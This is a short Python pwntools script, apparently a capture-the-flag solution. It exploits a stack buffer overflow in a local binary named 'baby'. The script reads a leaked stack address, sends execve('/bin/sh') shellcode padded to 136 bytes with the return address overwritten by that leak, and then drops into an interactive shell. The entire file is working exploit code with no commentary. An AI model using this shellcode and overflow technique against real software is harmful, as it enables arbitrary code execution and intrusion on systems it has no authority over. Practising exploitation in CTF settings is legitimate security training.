from pwn import *
target=process('./baby')

context.terminal=["tmux","split","-h"]
#gdb.attach(target,gdbscript="break *0x400622")

print(target.recvuntil("stack? "))
leak=target.recvline().strip("\n")
stack_leak=int(leak,16)

payload="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload+="A"*(136-len(payload))
payload+=p64(stack_leak)

target.sendline(payload)
target.interactive()

